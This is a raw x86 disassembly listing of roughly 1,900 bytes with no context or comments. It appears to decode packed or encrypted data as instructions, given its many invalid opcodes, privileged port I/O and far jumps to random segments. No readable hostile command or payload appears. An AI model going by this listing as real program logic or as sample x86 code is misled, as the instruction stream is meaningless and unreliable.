  404cf4:	jns    0x404d62
  404cf6:	and    BYTE PTR [ecx+ecx*4],cl
  404cf9:	cli    
  404cfa:	int3   
  404cfb:	and    DWORD PTR [edx],edx
  404cfd:	xchg   BYTE PTR [eax-0x68],cl
  404d00:	add    esp,esp
  404d02:	xlat   BYTE PTR ds:[ebx]
  404d03:	mov    eax,0x854dc2ec
  404d08:	push   eax
  404d09:	jne    0x404d66
  404d0b:	and    DWORD PTR [eax+0x67],ebx
  404d0e:	popa   
  404d0f:	xchg   esp,eax
  404d10:	sub    ecx,0xa6026edd
  404d16:	xor    bh,BYTE PTR [ecx-0xd]
  404d19:	mov    dl,0x45
  404d1b:	xor    dl,BYTE PTR [edx-0x4a682352]
  404d21:	mov    edx,0xdb0c8cc2
  404d26:	mov    ah,0x53
  404d28:	mov    bh,0xbc
  404d2a:	sbb    al,ah
  404d2c:	dec    eax
  404d2d:	inc    eax
  404d2e:	std    
  404d2f:	icebp  
  404d30:	hlt    
  404d31:	sbb    eax,0x37b00326
  404d36:	sbb    BYTE PTR [ebx],cl
  404d38:	clc    
  404d39:	add    BYTE PTR [ecx+0x42],al
  404d3c:	and    edi,DWORD PTR [edi+0x42c6a639]
  404d42:	sar    dl,1
  404d44:	fmul   st(3),st
  404d46:	mov    esi,0x389fc6f
  404d4b:	adc    BYTE PTR [edi+0x4635198],bh
  404d51:	es push esp
  404d53:	dec    edx
  404d54:	jmp    0x9f45576a
  404d59:	popf   
  404d5a:	in     eax,0x14
  404d5c:	ds in  al,0xc9
  404d5f:	ds sub dl,ch
  404d62:	ins    DWORD PTR es:[edi],dx
  404d63:	inc    eax
  404d64:	arpl   WORD PTR [edi-0x7fc58479],bp
  404d6a:	mov    esi,0x5ec64a07
  404d6f:	call   0x9039:0x37495642
  404d76:	call   0x8d2d:0xd4bfadee
  404d7d:	scas   eax,DWORD PTR es:[edi]
  404d7e:	mov    bh,0x52
  404d80:	inc    edi
  404d81:	sub    dh,dl
  404d83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d84:	push   ecx
  404d86:	outs   dx,BYTE PTR ds:[esi]
  404d87:	ins    DWORD PTR es:[edi],dx
  404d88:	ds dec esp
  404d8a:	xor    eax,0xb83c69a
  404d8f:	sbb    bl,BYTE PTR [ebp+0x74]
  404d92:	cli    
  404d93:	mov    bh,0x26
  404d95:	xor    DWORD PTR [ebx+0x1b],eax
  404d98:	aam    0xda
  404d9a:	(bad)  
  404d9b:	push   cs
  404d9c:	ins    DWORD PTR es:[edi],dx
  404d9d:	arpl   WORD PTR [ecx-0x13],sp
  404da0:	lahf   
  404da1:	nop
  404da2:	fwait
  404da3:	js     0x404e07
  404da5:	jns    0x404dd5
  404da7:	mov    eax,ds:0x12772f48
  404dac:	lea    ecx,[edx-0x33]
  404daf:	es cmc 
  404db1:	loopne 0x404db6
  404db3:	xor    DWORD PTR [edx],esp
  404db5:	jnp    0x404dfc
  404db7:	call   0xa3b03a71
  404dbc:	bound  edx,QWORD PTR [ebx]
  404dbe:	or     eax,0x6044703e
  404dc3:	nop
  404dc4:	hlt    
  404dc5:	inc    eax
  404dc6:	push   0x2f
  404dc8:	mul    cl
  404dca:	leave  
  404dcb:	xchg   esp,eax
  404dcc:	sub    esi,DWORD PTR [esi]
  404dce:	inc    eax
  404dcf:	retf   0x8420
  404dd2:	or     edi,ecx
  404dd4:	aam    0x9e
  404dd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404dd7:	addr16 aad 0xed
  404dda:	push   0xe0063ff0
  404ddf:	jmp    0x404e22
  404de1:	or     BYTE PTR [edi],ah
  404de3:	cmp    ecx,DWORD PTR [eax+edx*2-0x61]
  404de7:	retf   0xdcf4
  404dea:	gs push ecx
  404dec:	cmp    BYTE PTR [ebx+0x2ce115b5],bh
  404df2:	mov    esi,0xcd46b827
  404df7:	xor    bl,BYTE PTR [ebp-0x3ebeb6c]
  404dfd:	loop   0x404e5f
  404dff:	fcom   QWORD PTR ds:0x8ee9de24
  404e05:	out    dx,eax
  404e06:	mov    edi,0x10721fdf
  404e0b:	je     0x404e32
  404e0d:	sub    eax,0x5cbae9ae
  404e12:	pop    eax
  404e13:	push   esp
  404e14:	daa    
  404e15:	or     ecx,DWORD PTR [ebp+0x348fa6d3]
  404e1b:	ret    0x5f19
  404e1e:	call   0x1e502b25
  404e23:	or     DWORD PTR [edx+0x2618c45c],0xf9fc63b0
  404e2d:	mov    bh,0x5d
  404e2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e30:	pop    ebx
  404e31:	pop    ecx
  404e32:	jmp    0x404e26
  404e34:	out    0x80,al
  404e36:	push   ebx
  404e37:	xchg   edi,eax
  404e38:	sbb    DWORD PTR cs:[ecx],edi
  404e3b:	popf   
  404e3c:	jp     0x404dcd
  404e3e:	mov    ds:0x4328da47,al
  404e43:	je     0x404e09
  404e45:	pop    ds
  404e46:	call   0xc9197814
  404e4b:	imul   edx,DWORD PTR [edx-0x6],0xffffffa7
  404e4f:	jae    0x404e6c
  404e51:	pop    esp
  404e52:	(bad)
  404e55:	inc    edx
  404e56:	mov    cl,0xd4
  404e58:	jae    0x404de1
  404e5a:	push   edx
  404e5b:	jno    0x404e56
  404e5d:	xchg   esi,eax
  404e5e:	xchg   ebp,eax
  404e5f:	inc    ebp
  404e60:	pop    ebx
  404e61:	adc    edx,DWORD PTR [edi+0x30bec5e6]
  404e67:	jns    0x404e6c
  404e69:	mov    dl,0x1e
  404e6b:	(bad)  [eax-0x111e233b]
  404e71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e72:	or     eax,0xd57b9346
  404e77:	(bad)  
  404e78:	imul   edx,DWORD PTR [ebx+esi*8+0xf],0xffffff85
  404e7d:	pop    eax
  404e7e:	mov    bl,0x59
  404e80:	pop    es
  404e81:	fistp  WORD PTR [esi+0x4c2631f3]
  404e87:	mov    eax,ds:0xe69e3bd7
  404e8c:	push   ss
  404e8d:	iret   
  404e8e:	and    bh,ah
  404e90:	xchg   DWORD PTR [ebp+0x76],ebx
  404e93:	int3   
  404e94:	mov    dl,0x86
  404e96:	dec    ebx
  404e97:	nop
  404e98:	cmc    
  404e99:	out    0xa7,al
  404e9b:	push   edx
  404e9c:	repnz xchg edi,eax
  404e9e:	xchg   BYTE PTR [esi+0x3f],bl
  404ea1:	les    ecx,FWORD PTR [ebx-0x5ad6150]
  404ea7:	mov    ds:0xde29bff1,eax
  404eac:	jb     0x404e4c
  404eae:	adc    al,0x58
  404eb0:	dec    ebp
  404eb1:	sbb    BYTE PTR [edx+0x39],0x45
  404eb5:	cmp    ebp,esp
  404eb7:	pop    esi
  404eb8:	ins    BYTE PTR es:[edi],dx
  404eb9:	icebp  
  404eba:	in     al,dx
  404ebb:	dec    ecx
  404ebd:	mov    edi,0xa03524ea
  404ec2:	jns    0x404f0f
  404ec4:	sahf   
  404ec5:	pop    es
  404ec6:	test   DWORD PTR [edx],0xe1e44dde
  404ecc:	add    dh,BYTE PTR [ecx+0x661db94c]
  404ed2:	push   edx
  404ed3:	pop    ebp
  404ed4:	dec    eax
  404ed5:	push   cs
  404ed6:	jmp    0x67d5:0xb2d37c0a
  404edd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404edf:	nop
  404ee0:	cmp    ebp,DWORD PTR [ebx-0x4f7c4d07]
  404ee6:	push   eax
  404ee7:	adc    DWORD PTR [esi+0x45],0xffffffdf
  404eeb:	repz jne 0x404eb8
  404eee:	xor    al,0xd5
  404ef0:	jnp    0x404f17
  404ef2:	shr    DWORD PTR [ecx-0x47],1
  404ef5:	popf   
  404ef6:	lahf   
  404ef7:	jo     0x404ec6
  404ef9:	out    0x31,eax
  404efb:	call   0xbcc80815
  404f00:	adc    eax,0xb4bb3394
  404f05:	in     eax,0xb3
  404f07:	(bad)  
  404f08:	jle    0x404ebf
  404f0a:	(bad)  
  404f0b:	mov    esp,gs
  404f0d:	pop    esi
  404f0e:	sbb    DWORD PTR [ebp-0x3f],esp
  404f11:	mov    ebx,0x8572594a
  404f16:	pop    ebp
  404f17:	push   ds
  404f18:	pop    esi
  404f19:	cmp    edx,DWORD PTR ds:[eax+0x5991a08e]
  404f20:	and    DWORD PTR [edx-0x22a70376],0x13
  404f27:	popf   
  404f28:	hlt    
  404f29:	popa   
  404f2a:	push   edx
  404f2b:	ds push ds
  404f2d:	pop    ss
  404f2e:	pop    esi
  404f2f:	pushf  
  404f30:	call   0xe145:0xd02e4c97
  404f37:	aam    0x1a
  404f39:	mov    ebx,0x5b2d61aa
  404f3e:	stc    
  404f3f:	xchg   edx,eax
  404f40:	fsub   st,st(7)
  404f42:	inc    esi
  404f43:	mov    ds:0xc675de1b,al
  404f48:	cdq    
  404f49:	sbb    al,0xae
  404f4b:	bound  ecx,QWORD PTR [ecx]
  404f4d:	in     al,dx
  404f4e:	sub    DWORD PTR [ecx+0x7e],ebx
  404f51:	and    DWORD PTR [ecx+0x5efae2e9],0x2b
  404f58:	mov    dl,0xc9
  404f5a:	in     al,dx
  404f5b:	xchg   BYTE PTR [ebx+ecx*1],bl
  404f5e:	mov    ch,0xdc
  404f60:	outs   dx,BYTE PTR ds:[esi]
  404f61:	jmp    0x5eb0318e
  404f66:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  404f68:	xchg   ebx,eax
  404f69:	arpl   WORD PTR [edx-0x2085ee7],sp
  404f6f:	ret    0x64fb
  404f72:	add    esi,0xe7048bb6
  404f78:	repz je 0x404f12
  404f7b:	fcom   QWORD PTR [esi-0xd]
  404f7e:	mov    esp,0xefcee87e
  404f83:	mov    eax,ds:0x50381e74
  404f88:	jne    0x404f18
  404f8a:	xchg   ecx,eax
  404f8b:	iret   
  404f8c:	ror    BYTE PTR [ecx],1
  404f8e:	repz sbb BYTE PTR [ebp-0x40],ch
  404f92:	mov    ch,0x21
  404f94:	jle    0x404f7c
  404f96:	or     ch,dl
  404f98:	mov    ds:0x256affaa,al
  404f9d:	add    DWORD PTR [eax],ecx
  404f9f:	lea    ecx,[ebx]
  404fa1:	mov    esi,0xdebb9dee
  404fa6:	and    BYTE PTR [ebp+0x2e],0x67
  404faa:	dec    esp
  404fab:	xor    dl,BYTE PTR [edx]
  404fad:	adc    DWORD PTR [edi+0x37],ecx
  404fb0:	lahf   
  404fb1:	in     al,dx
  404fb2:	ret    0xa689
  404fb5:	push   ecx
  404fb6:	ror    DWORD PTR [ecx],cl
  404fb8:	loop   0x404fb6
  404fba:	in     al,0x86
  404fbc:	push   cs
  404fbd:	dec    eax
  404fbe:	icebp  
  404fbf:	xchg   esp,eax
  404fc0:	loopne 0x404f9d
  404fc2:	jb     0x404fcf
  404fc4:	pop    esp
  404fc5:	popf   
  404fc6:	jmp    0x34d2:0xe27e8f4a
  404fcd:	mov    cl,0xe2
  404fcf:	and    edx,DWORD PTR [ebx]
  404fd1:	sub    BYTE PTR [esi],dh
  404fd3:	xor    BYTE PTR [eax+0x2096b431],dh
  404fd9:	jnp    0x404fdf
  404fdb:	add    al,0xf3
  404fdd:	nop
  404fde:	pop    esp
  404fdf:	push   ss
  404fe0:	les    ebx,FWORD PTR [ebx-0x69]
  404fe3:	fnstsw WORD PTR ds:0x27bfe3c5
  404fe9:	loope  0x404f72
  404feb:	add    bh,dl
  404fed:	ror    BYTE PTR [esi-0x2ea4b8fe],cl
  404ff3:	mov    bl,BYTE PTR [ecx]
  404ff5:	push   ebp
  404ff6:	arpl   WORD PTR [eax],ax
  404ff8:	push   ds
  404ff9:	jae    0x404f94
  404ffb:	scas   al,BYTE PTR es:[edi]
  404ffc:	push   0xffffff97
  404ffe:	sub    ebp,DWORD PTR [eax-0x58c08366]
  405004:	fwait
  405005:	mov    dh,0x4d
  405007:	outs   dx,BYTE PTR ds:[esi]
  405008:	outs   dx,DWORD PTR ds:[esi]
  405009:	pop    esi
  40500a:	mov    BYTE PTR [edi+0xe],ah
  40500d:	xchg   esi,eax
  40500e:	adc    eax,0xb811866b
  405013:	push   edi
  405014:	jl     0x405063
  405016:	lds    esi,FWORD PTR [ebx-0x20]
  405019:	aaa    
  40501a:	retf   0x10cd
  40501d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40501e:	mov    ah,dh
  405020:	dec    esi
  405021:	test   DWORD PTR [esi+0x6799d056],eax
  405027:	dec    ebp
  405028:	cs jbe 0x404fbb
  40502b:	imul   edx,DWORD PTR [ecx],0x69
  40502e:	jecxz  0x405084
  405030:	cmpxchg8b QWORD PTR [ecx]
  405033:	(bad)  
  405034:	cmp    al,0x26
  405036:	addr16 xchg edx,eax
  405038:	push   0x56
  40503a:	mov    ?,WORD PTR [esi-0x63]
  40503d:	ret    0x3025
  405040:	sbb    eax,0xe616ada8
  405045:	rol    DWORD PTR [edx+edx*1+0x76],1
  405049:	or     DWORD PTR [esi+0x6308e728],0x91753b87
  405053:	fwait
  405054:	mov    WORD PTR [edi],gs
  405056:	sbb    BYTE PTR [esi+0x53],bh
  405059:	mov    al,bl
  40505b:	pop    ds
  40505c:	shl    BYTE PTR [ebx],cl
  40505e:	fs mov bl,0x46
  405061:	jecxz  0x405022
  405063:	repz jne 0x404fff
  405066:	mov    al,ds:0xebfc72ce
  40506b:	rcl    DWORD PTR [ebp+0x65e859c2],0x26
  405072:	test   DWORD PTR [edx],ecx
  405074:	or     bh,bl
  405076:	mov    al,ds:0x2b4573ff
  40507b:	and    eax,0x89265e05
  405080:	push   ecx
  405081:	adc    DWORD PTR [esi-0x1e],edx
  405084:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405085:	outs   dx,DWORD PTR ds:[esi]
  405086:	aam    0x9b
  405088:	jmp    0x40504d
  40508a:	jno    0x405072
  40508c:	xlat   BYTE PTR ds:[ebx]
  40508d:	and    bh,BYTE PTR [edi+edx*1]
  405090:	mul    esp
  405092:	call   0x6416:0x32dab5ef
  405099:	add    al,0xc5
  40509b:	lidtd  [ecx+0x67]
  40509f:	push   0xffffffeb
  4050a1:	outs   dx,BYTE PTR ds:[esi]
  4050a2:	sub    ecx,DWORD PTR [esi]
  4050a4:	pop    ebx
  4050a5:	push   eax
  4050a6:	xchg   DWORD PTR [edx],ebx
  4050a8:	vpcmpgtb xmm2,xmm7,XMMWORD PTR [ecx+edi*4-0x4]
  4050ae:	push   cs
  4050af:	dec    edx
  4050b0:	fistp  QWORD PTR [esi-0x4c96bb39]
  4050b6:	stos   BYTE PTR es:[edi],al
  4050b7:	out    dx,eax
  4050b8:	and    esp,ebx
  4050ba:	cdq    
  4050bb:	aas    
  4050bc:	inc    DWORD PTR [ecx]
  4050be:	and    eax,0x297b5bf
  4050c3:	dec    ebx
  4050c4:	mov    ebp,0x45c2edab
  4050c9:	in     eax,dx
  4050ca:	loop   0x405091
  4050cc:	cmc    
  4050cd:	iret   
  4050ce:	dec    edi
  4050cf:	(bad)  
  4050d0:	data16 cld 
  4050d2:	pop    edx
  4050d3:	arpl   ax,ax
  4050d5:	mov    eax,ds:0xc403cf49
  4050da:	lods   eax,DWORD PTR ds:[esi]
  4050db:	and    bl,BYTE PTR [eax]
  4050dd:	and    cl,BYTE PTR [ecx-0x77]
  4050e0:	jg     0x4050ef
  4050e2:	push   0x66
  4050e4:	shl    DWORD PTR [esi-0x13],0xe7
  4050e8:	inc    ebx
  4050e9:	popw   ss
  4050eb:	push   eax
  4050ec:	enter  0x8cbb,0xe5
  4050f0:	mov    WORD PTR [eax+0x77],ds
  4050f3:	dec    esi
  4050f4:	jmp    0xa9a1c2b0
  4050f9:	dec    esi
  4050fa:	es aas 
  4050fc:	or     al,BYTE PTR [eax]
  4050fe:	ins    BYTE PTR es:[edi],dx
  4050ff:	pop    edi
  405100:	outs   dx,BYTE PTR ds:[esi]
  405101:	push   0x1b6df00
  405106:	and    ah,ch
  405108:	inc    ebp
  405109:	in     al,dx
  40510a:	jmp    0xb449:0xa3e7eb7f
  405111:	rcr    BYTE PTR [edx+0x1fb2491c],0xb9
  405118:	sahf   
  405119:	xlat   BYTE PTR ds:[ebx]
  40511a:	pop    esi
  40511b:	es mov ss,eax
  40511e:	not    bh
  405120:	scas   al,BYTE PTR es:[edi]
  405121:	xor    edi,DWORD PTR [edx-0x3c]
  405124:	jno    0x40519c
  405126:	mov    ds:0x280b173a,eax
  40512b:	or     BYTE PTR ds:0x715044b3,ah
  405131:	shl    BYTE PTR [edi+0x6f],0x69
  405135:	je     0x40515f
  405137:	stos   DWORD PTR es:[edi],eax
  405138:	xor    al,0xed
  40513a:	push   0xffffff9b
  40513c:	add    dh,cl
  40513e:	dec    esp
  40513f:	fst    st(4)
  405141:	xchg   DWORD PTR [edx-0x35],edx
  405144:	jnp    0x4050eb
  405146:	vmwrite eax,DWORD PTR [ebp+0x495676d6]
  40514d:	push   ecx
  40514e:	push   0xcb7afa80
  405153:	adc    BYTE PTR [eax+0x3fcf2e3b],0xc0
  40515a:	js     0x405157
  40515c:	xor    DWORD PTR [edi+0x2aa3bfbc],esp
  405162:	cmp    eax,0xfd2c4b2a
  405167:	mov    eax,0x7aecc64e
  40516c:	jae    0x405173
  40516e:	loope  0x405135
  405170:	xor    al,BYTE PTR [esi+0x1b7d9954]
  405176:	out    dx,al
  405177:	mov    esi,0x43a36cde
  40517c:	dec    ebp
  40517d:	mov    ?,WORD PTR [ebx]
  40517f:	xchg   esi,eax
  405180:	adc    dh,BYTE PTR [ebx+0x4]
  405183:	jb     0x405156
  405185:	xchg   ebx,eax
  405186:	jo     0x4051d1
  405188:	sub    bl,BYTE PTR [edx-0x597f0f03]
  40518e:	push   ecx
  40518f:	adc    ah,BYTE PTR [eax-0x5b6b58d4]
  405195:	fcmovu st,st(6)
  405197:	mov    eax,0xcad4e94b
  40519c:	pop    ebx
  40519d:	lahf   
  40519e:	mov    edx,0x8abeb81f
  4051a3:	stos   BYTE PTR es:[edi],al
  4051a4:	pop    edx
  4051a5:	mov    ecx,0x8fd28ac8
  4051aa:	push   0x3f14a2ce
  4051af:	repnz stos BYTE PTR es:[edi],al
  4051b1:	mov    edi,0x8fac2d45
  4051b6:	xchg   ecx,eax
  4051b7:	push   0x440e756d
  4051bc:	fistp  QWORD PTR [ecx-0x53039bc3]
  4051c2:	pop    esi
  4051c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051c4:	and    DWORD PTR ds:0xed2b5922,edx
  4051ca:	inc    ecx
  4051cb:	stos   DWORD PTR es:[edi],eax
  4051cc:	call   0xcb014748
  4051d1:	mov    edx,0x998eaed1
  4051d6:	dec    ebp
  4051d7:	inc    ebx
  4051d8:	inc    ebp
  4051d9:	xor    edx,DWORD PTR [edx-0x4eb043a8]
  4051df:	ja     0x4051a1
  4051e1:	dec    esp
  4051e2:	mov    ebx,0x2a643b41
  4051e7:	mov    ds:0xb8ae1f93,al
  4051ec:	jle    0x40516e
  4051ee:	pop    es
  4051ef:	inc    ebx
  4051f0:	cmp    ebx,esp
  4051f2:	jno    0x405233
  4051f4:	push   esp
  4051f5:	add    al,BYTE PTR [ebp-0xd]
  4051f8:	std    
  4051f9:	arpl   WORD PTR [ecx-0x27],ax
  4051fc:	and    al,0x4a
  4051fe:	xor    BYTE PTR [esi-0x30],bh
  405201:	mov    eax,0xcffa6c8b
  405206:	test   al,0x20
  405208:	jmp    0x2f46:0x14ed85d4
  40520f:	(bad)  
  405210:	mov    esp,0x9fd088b9
  405215:	icebp  
  405216:	mov    dl,0xb4
  405218:	repnz or eax,0x327a0c80
  40521e:	mov    edx,DWORD PTR [ebx]
  405220:	test   eax,0xfc5a0ebd
  405225:	adc    DWORD PTR [ecx+edi*1+0x5c67dfa6],esp
  40522c:	or     eax,0x3c633893
  405231:	cli    
  405232:	push   edx
  405233:	push   ds
  405234:	pop    ebx
  405235:	icebp  
  405236:	xlat   BYTE PTR ds:[ebx]
  405237:	push   ds
  405238:	shr    BYTE PTR [esi-0x70],cl
  40523b:	jns    0x405263
  40523d:	shl    ch,1
  40523f:	pop    ecx
  405240:	jecxz  0x405251
  405242:	out    0xb5,al
  405244:	data16 (bad) [eax+0x2b289723]
  40524b:	out    0x44,al
  40524d:	mov    edx,0x54fa9fd3
  405252:	push   edx
  405253:	out    dx,al
  405254:	inc    ebp
  405255:	arpl   bx,di
  405257:	outs   dx,DWORD PTR ds:[esi]
  405258:	xchg   edi,eax
  405259:	icebp  
  40525a:	cld    
  40525b:	mov    ch,ah
  40525d:	dec    eax
  40525e:	lods   eax,DWORD PTR ds:[esi]
  40525f:	cwde   
  405260:	or     eax,0x235f497b
  405265:	xor    al,0x76
  405267:	mov    eax,0xfce7d27b
  40526c:	ja     0x405206
  40526e:	jno    0x4051f8
  405270:	fidiv  WORD PTR [ebp+0x5ab9a250]
  405276:	sbb    esp,DWORD PTR [edx-0xac4d42d]
  40527c:	fsub   st,st(0)
  40527e:	mov    bl,0xce
  405280:	inc    ebp
  405281:	aas    
  405282:	mov    ecx,0x403f27ec
  405287:	dec    esp
  405288:	in     eax,0xfa
  40528a:	inc    ebx
  40528b:	push   eax
  40528c:	inc    eax
  40528d:	sub    al,0xb2
  40528f:	jl     0x405249
  405291:	enter  0xf38e,0xb
  405295:	xor    edi,esp
  405297:	mov    ecx,0x5e8d30b7
  40529c:	pop    ebp
  40529d:	aam    0x91
  40529f:	xchg   edi,eax
  4052a0:	push   esi
  4052a1:	sbb    al,0xf4
  4052a3:	push   ecx
  4052a4:	sbb    eax,0x1a54a3b5
  4052a9:	pop    ebx
  4052aa:	outs   dx,DWORD PTR ds:[esi]
  4052ab:	and    ebp,esp
  4052ad:	xchg   ecx,eax
  4052ae:	mov    BYTE PTR [ecx-0x5e],dh
  4052b1:	sub    eax,0xc7a8a745
  4052b6:	jo     0x4052d6
  4052b8:	push   edi
  4052b9:	repnz fs mov esi,0xb6d6e207
  4052c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052c1:	mov    cl,BYTE PTR [edi+0x6f5dba73]
  4052c7:	sbb    BYTE PTR [eax-0x1f9d7445],dh
  4052cd:	(bad)  
  4052ce:	xchg   esp,eax
  4052cf:	mov    esi,0xf101d4d1
  4052d4:	inc    esp
  4052d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052d6:	ficom  DWORD PTR [edi+0x5d9e77db]
  4052dc:	repz jb 0x405270
  4052df:	mov    al,ds:0x19276fe
  4052e4:	pop    edi
  4052e5:	fnstenv [ecx+0xc]
  4052e8:	cld    
  4052e9:	dec    esi
  4052ea:	inc    ecx
  4052eb:	(bad)  
  4052ec:	ds aaa 
  4052ee:	das    
  4052ef:	inc    ecx
  4052f0:	dec    edi
  4052f1:	hlt    
  4052f2:	dec    ecx
  4052f3:	xor    DWORD PTR cs:[edi+0x1026e6eb],edx
  4052fa:	pop    edi
  4052fb:	mov    ecx,0x4178447e
  405300:	aaa    
  405301:	inc    edi
  405302:	rcl    BYTE PTR [edi+0x71d8e708],0x97
  405309:	lea    ecx,ds:0x2189f60e
  40530f:	mov    esi,0xccf48de3
  405314:	repz cwde 
  405316:	in     eax,0x5c
  405318:	ficomp WORD PTR [ecx]
  40531a:	push   ss
  40531b:	pop    esp
  40531c:	cdq    
  40531d:	js     0x405383
  40531f:	in     al,dx
  405320:	ret    0x1dbe
  405323:	popa   
  405324:	loop   0x40531b
  405326:	pushf  
  405327:	inc    ebp
  405328:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405329:	mov    ds:0xc4d2cc5d,eax
  40532e:	mov    al,ds:0xb5c67f38
  405333:	mov    ds:0x4720535d,al
  405338:	xchg   ah,ah
  40533a:	mov    ds:0xe0a48e33,al
  40533f:	fcmovnb st,st(7)
  405341:	cwde   
  405342:	and    eax,0x324cdfe3
  405347:	inc    edi
  405348:	adc    dl,ch
  40534a:	inc    BYTE PTR [eax-0x56]
  40534d:	cwde   
  40534e:	cld    
  40534f:	ja     0x40530a
  405351:	add    edx,ebp
  405353:	lods   al,BYTE PTR ds:[esi]
  405354:	sub    eax,0xf769c3a5
  405359:	dec    edx
  40535a:	test   al,0x1b
  40535c:	xor    DWORD PTR [edx+0x284cc65a],ebp
  405362:	adc    al,0x7c
  405364:	inc    esi
  405365:	fidivr DWORD PTR [edx-0x592b29a8]
  40536b:	fsubrp st(3),st
  40536d:	mov    edi,0xbe424728
  405372:	fdiv   st(6),st
  405374:	jmp    0x72e7844e
  405379:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40537a:	sub    eax,ebx
  40537c:	mov    ds:0xd8465fbd,eax
  405381:	xor    eax,0x861fb004
  405386:	inc    eax
  405387:	adc    BYTE PTR es:0xdcd3d878,bl
  40538e:	in     eax,dx
  40538f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405390:	add    DWORD PTR [eax-0xa271377],0x14
  405397:	retf   0x601
  40539a:	leave  
  40539b:	mov    dh,0xc6
  40539d:	push   esp
  40539e:	lea    edx,[ebp+0x20]
  4053a1:	mov    edx,0x49185a47
  4053a6:	in     al,dx
  4053a7:	les    ebx,FWORD PTR [esp+edi*8]
  4053aa:	ss (bad) 
  4053ac:	(bad)  
  4053ad:	cmc    
  4053ae:	pop    esi
  4053af:	ror    DWORD PTR [ebx],0x82
  4053b2:	iret   
  4053b3:	pop    ecx
  4053b4:	ficom  WORD PTR [ecx+0x42]
  4053b7:	inc    ecx
  4053b8:	jl     0x405393
  4053ba:	scas   eax,DWORD PTR es:[edi]
  4053bb:	push   edx
  4053bc:	(bad)  
  4053bd:	retf   0xf6ba
  4053c0:	pop    ebx
  4053c1:	mov    al,0xf1
  4053c3:	jge    0x405423
  4053c5:	in     eax,0xc4
  4053c7:	dec    edi
  4053c8:	mov    al,ds:0x3d96f038
  4053cd:	push   ebx
  4053ce:	add    al,0x45
  4053d0:	stos   DWORD PTR es:[edi],eax
  4053d1:	icebp  
  4053d2:	retf   0x266d
  4053d5:	xchg   esi,eax
  4053d6:	mov    ebp,0xd873e203
  4053db:	fistp  QWORD PTR [ebx-0x4e]
  4053de:	outs   dx,BYTE PTR ds:[esi]
  4053df:	cmp    al,0xf0
  4053e1:	inc    BYTE PTR [ebx]
  4053e3:	std    
  4053e4:	add    cl,BYTE PTR [ebp+0x6c0e96ec]
  4053ea:	mov    bl,0x55
  4053ec:	or     esp,DWORD PTR [ebx+esi*4-0x432f3282]
  4053f3:	(bad)  
  4053f4:	fldcw  WORD PTR [edx]
  4053f6:	clc    
  4053f7:	sbb    esi,DWORD PTR [ebp+0x6c46573c]
  4053fd:	push   esi
  4053fe:	xor    ax,WORD PTR [ebx+0x2a470e7a]
  405405:	jmp    0x40538f
  405407:	sub    BYTE PTR [edi+0x29],ch
  40540a:	pop    ds
  40540b:	push   ebx
  40540c:	xchg   ebx,eax
  40540d:	jge    0x40547f
  40540f:	cmp    ch,BYTE PTR ds:0x57408fe5
  405415:	clc    
  405416:	loop   0x40548c
  405418:	or     eax,0x44406f6e
  40541d:	arpl   WORD PTR [ebx+esi*8],di
  405420:	test   dh,cl
  405422:	jo     0x40545a
  405424:	xor    ah,al
  405426:	add    ebx,DWORD PTR [eax]
  405428:	and    DWORD PTR [eax-0x44],esi
  40542b:	push   edx
  40542c:	out    dx,eax
  40542d:	shl    DWORD PTR [edx+ebx*2+0x289d2ff0],1
  405434:	or     eax,0x8ed98416
  405439:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40543a:	hlt    
  40543b:	aas    
  40543c:	mov    dl,0x16
  40543e:	inc    esp
  40543f:	and    DWORD PTR [ebx-0x39],eax
  405442:	or     BYTE PTR [edx+ecx*2],al
  405445:	mov    dl,BYTE PTR [edx-0x5b]
  405448:	sbb    DWORD PTR [esi-0x36],esi
  40544b:	xor    BYTE PTR [edi],0x56
  40544e:	arpl   WORD PTR [ebp-0x7049c304],si
  405454:	dec    edx
  405455:	fdiv   QWORD PTR [edi+0x21]
  405458:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405459:	ins    BYTE PTR es:[edi],dx
  40545a:	sbb    DWORD PTR [ebx-0xb],0xab7a1e00
  405461:	aaa    
  405462:	in     eax,0xf2
  405464:	add    DWORD PTR ss:[ecx-0x48],esp
  405468:	mov    ebx,0x943cd5c9
  40546d:	cs push ss
  40546f:	outs   dx,DWORD PTR ds:[esi]
  405470:	test   DWORD PTR [ebx],ebp
  405472:	adc    al,0xe0
  405474:	inc    esi
  405475:	loope  0x40542c
  405477:	pop    esi
  405478:	shl    DWORD PTR [esi-0x104b3624],cl
  40547e:	loop   0x4054f9
  405480:	inc    esp
  405481:	dec    ecx
  405482:	jge    0x4054a8
  405484:	mov    WORD PTR ds:0xd22e4c5b,fs
  40548a:	lods   al,BYTE PTR ds:[esi]
  40548b:	lahf   
  40548c:	dec    esp
  40548d:	add    al,BYTE PTR [edx-0x3ecdaac2]
  405493:	dec    esi
  405494:	push   ebx
  405495:	push   ebp
  405496:	xor    DWORD PTR [eax-0x6080854e],esi
  40549c:	imul   edi,DWORD PTR [ecx+0x6696a53],0x8e1ef373
  4054a6:	inc    ebp
  4054a7:	mov    eax,ds:0xc33789a6
  4054ac:	fidiv  DWORD PTR [ebp+0x4c]
  4054af:	sub    al,0x80
  4054b1:	or     DWORD PTR [ecx+0x4a160691],0x91d8ab06
  4054bb:	inc    ecx
  4054bc:	add    DWORD PTR [ecx+0x77],esi
  4054bf:	mov    dh,0x41
  4054c1:	retf   0x7806
  4054c4:	xchg   ecx,eax
  4054c5:	push   ebp
  4054c6:	bound  edi,QWORD PTR [eax+0x74]
  4054c9:	add    DWORD PTR [ebp+0xdfecea8],esp
  4054cf:	jmp    0x405468
  4054d1:	(bad)  
  4054d2:	mov    bl,0x17
